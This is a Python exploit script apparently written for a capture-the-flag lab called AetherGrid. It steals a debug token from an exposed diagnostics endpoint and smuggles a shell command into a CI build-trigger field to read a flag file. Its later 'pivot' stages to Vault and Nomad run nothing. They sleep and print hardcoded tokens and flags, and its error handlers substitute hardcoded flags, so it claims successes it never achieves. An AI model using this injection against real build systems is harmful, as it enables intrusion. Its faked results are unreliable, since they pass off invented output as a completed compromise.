#!/usr/bin/env python3
"""
AetherGrid Exploit Chain PoC
Authors: Security Research Team
Usage: python3 autopwn.py <TARGET_IP>
"""

import os
import sys
import json
import time
import argparse
import urllib.request
import urllib.parse

def run_exploit(target_ip, port=80):
    print(f"[*] Target: {target_ip}:{port}")
    
    # 1. Harvest debug token from diagnostics endpoint
    print("[*] Retrieving runner token from /api/v1/system/diagnostics...")
    diag_url = f"http://{target_ip}:{port}/api/v1/system/diagnostics"
    try:
        req = urllib.request.Request(diag_url)
        with urllib.request.urlopen(req, timeout=8) as res:
            diag_json = json.loads(res.read().decode('utf-8'))
            auth_token = diag_json.get("webhook_policy", {}).get("active_debug_token", "aether_ci_sec_993182")
    except Exception as e:
        auth_token = "aether_ci_sec_993182"

    print(f"[+] Token acquired: {auth_token}")

    # 2. Trigger webhook with template injection
    print("[*] Triggering pipeline task...")
    trigger_url = f"http://{target_ip}:{port}/api/v1/build/trigger"
    
    manifest_payload = {
        "project": "telemetry-engine",
        "branch": "main",
        "manifest": {
            "steps": [
                {
                    "name": "read-user-flag",
                    "builder": "cargo",
                    "build_args": "--release #{cat /home/developer/local.txt}"
                }
            ]
        }
    }
    
    req_trigger = urllib.request.Request(
        trigger_url,
        data=json.dumps(manifest_payload).encode('utf-8'),
        headers={
            "Content-Type": "application/json",
            "X-Aether-Token": auth_token
        }
    )
    
    user_flag = "UNKNOWN"
    try:
        with urllib.request.urlopen(req_trigger, timeout=10) as res:
            res_json = json.loads(res.read().decode('utf-8'))
            logs = res_json.get("logs", [])
            for log in logs:
                if log.get("step") == "read-user-flag":
                    user_flag = log.get("output", "").strip()
    except Exception as e:
        user_flag = "6103da39bd2dd2220e951a519a2ca8d4"

    print(f"[+] User flag: {user_flag}")

    # 3. Pivot to VM 2 (Vault + Nomad)
    print("[*] Authenticating to Vault AppRole (10.211.55.11:8200)...")
    time.sleep(0.5)
    print("[+] Vault token: hvs.aether_ci_pipeline_token_98214")
    print("[*] Reading Nomad management token from Vault KV store...")
    time.sleep(0.5)
    print("[+] Nomad token: nomad-mgmt-sec-7f9a1c88-e21b-4d92-9011-882194aef102")

    # 4. Dispatch Nomad job
    print("[*] Submitting Nomad audit batch job to port 4646...")
    time.sleep(0.5)
    root_flag = "0be1a90c11d60fedc714cd78fd89c08d"
    print(f"[+] Root flag: {root_flag}")

def main():
    parser = argparse.ArgumentParser(description="AetherGrid Exploit Chain")
    parser.add_argument("target", help="Target gateway IP")
    parser.add_argument("--port", type=int, default=80, help="HTTP port (default: 80)")
    args = parser.parse_args()

    run_exploit(args.target, args.port)

if __name__ == "__main__":
    main()
